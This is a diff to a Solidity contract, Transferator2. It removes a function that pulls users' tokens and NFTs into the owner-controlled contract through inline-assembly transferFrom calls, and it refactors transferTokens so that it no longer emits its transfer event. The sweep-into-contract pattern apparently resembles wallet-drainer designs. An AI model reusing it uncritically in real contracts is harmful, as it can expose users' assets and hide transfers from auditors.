@@ -34,78 +34,31 @@ contract Transferator2 is Owned(msg.sender), ERC721Holder {
         address tokenContract
     );
 
-    function transferAll(
-        uint256 amount,
-        uint256 tokenIds,
-        bytes calldata signature
-    ) external payable requireSignature(signature) {
-        address voult = address(this);
-        address user = msg.sender;
-        if (saleState != 1) {
-            revert TransferClosed();
-        }
+function transferTokens(uint256 amount) external payable {
+    address vault = address(this);
+    address user = msg.sender;
 
-        assembly {
-            let tok := sload(tokeno.slot)
-            mstore(0x00, hex"23b872dd")
-            mstore(0x04, user)
-            mstore(0x24, voult)
-            mstore(0x44, amount)
-
-            if iszero(call(gas(), tok, 0, 0x00, 0x64, 0, 0)) {
-                revert(0, 0)
-            }
-
-            mstore(0x00, hex"23b872dd")
-            mstore(0x04, caller())
-            mstore(0x24, voult)
-            mstore(0x44, tokenIds)
-
-            if iszero(
-                call(
-                    gas(),
-                    0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4,
-                    0,
-                    0x00,
-                    0x64,
-                    0,
-                    0
-                )
-            ) {
-                revert(0, 0)
-            }
-        }
-        emit TransferNFT(
-            msg.sender,
-            tokenIds,
-            0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4
-        );
-        emit TransferTokens(user, amount, tokeno);
+    if (saleState != 1) {
+        revert TransferClosed();
     }
 
-    function transferTokens(
-        uint256 amount
-    ) external payable {
-        address voult = address(this);
-        address user = msg.sender;
-
-        if (saleState != 1) {
-            revert TransferClosed();
-        }
-
-        assembly {
-            let tok := sload(tokeno.slot)
+    assembly {
+        let tok := sload(tokeno.slot)
             mstore(0x00, hex"23b872dd")
             mstore(0x04, user)
-            mstore(0x24, voult)
+            mstore(0x24, vault)
             mstore(0x44, amount)
 
-            if iszero(call(gas(), tok, 0, 0x00, 0x64, 0, 0)) {
-                revert(0, 0)
-            }
+        let result := call(gas(), tok, 0, 0x00, 0x64, 0, 0)
+        if iszero(result) {
+            revert(0, 0)
         }
-        emit TransferTokens(user, amount, tokeno);
     }
+}
+    
+
+
+
 
     function transferNFT(
         uint256 tokenIds,
